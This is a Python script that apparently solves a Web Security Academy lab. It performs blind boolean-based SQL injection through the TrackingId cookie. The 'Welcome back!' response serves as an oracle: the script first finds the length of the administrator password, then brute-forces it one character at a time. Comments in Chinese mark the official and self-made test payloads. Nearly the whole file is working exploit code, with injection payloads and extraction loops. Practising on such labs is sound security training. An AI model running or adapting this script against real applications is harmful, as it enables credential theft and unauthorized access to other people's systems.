import requests
import string

session = requests.Session()

BASE_URL = "https://0af9001904bd23b08003083b008d00a2.web-security-academy.net/filter"

def is_find_welcome(payload:str)-> bool:
    print(f"payload:{payload}")
    cookies={
        "TrackingId":payload, 
        "session":"JnfMj5A7C174SYjKn65LGUQmjaB0uAPK"
    }

    params = {
        "category":"Gifts"
    }
    response = session.get(BASE_URL, cookies=cookies, params=params, timeout=10)
    if "Welcome back!" in response.text:
        return True
    else:
        print(f"failed: {response.status_code}")
        return False

def find_pw_len()->int:
    for num in range(1, 25):
        payload=f"' or (select 'a' from users where username = 'administrator' AND LENGTH(password)>{num})= 'a"
        if is_find_welcome(payload)==False:
            return num


WORD_LIST = list(string.digits + string.ascii_letters)

def find_pw(pw_len:int)->str:
    pw = ""
    for num in range(1, pw_len+1):
        for word in WORD_LIST:
            payload=f"' or (select (SUBSTRING(password,{num},1)) from users where username = 'administrator')= '{word}"
            if is_find_welcome(payload):
                pw+=word
                break  
    return pw

def main():
    #官方測試==============
    payload="JPu7FKUc6cC67KOP' AND '1'='1"
    is_find_welcome(payload)

    payload="JPu7FKUc6cC67KOP' AND '1'='2"
    is_find_welcome(payload)

    #我自己嘗試測試=========
    payload="' or '1'='1"
    is_find_welcome(payload)

    payload="' or '1'='2"
    is_find_welcome(payload)

    payload="' or (select 'a' from users limit 1 )= 'a"
    is_find_welcome(payload)

    payload="' or (select 'a' from users where username = 'administrator' )= 'a"
    is_find_welcome(payload)

    payload="' or (select 'a' from users where username = 'administrator' AND LENGTH(password)>1)= 'a"
    is_find_welcome(payload)

    pw_len = find_pw_len()
    print(f"pw_len:{pw_len}")

    print(find_pw(20))





if __name__ == "__main__":
    main()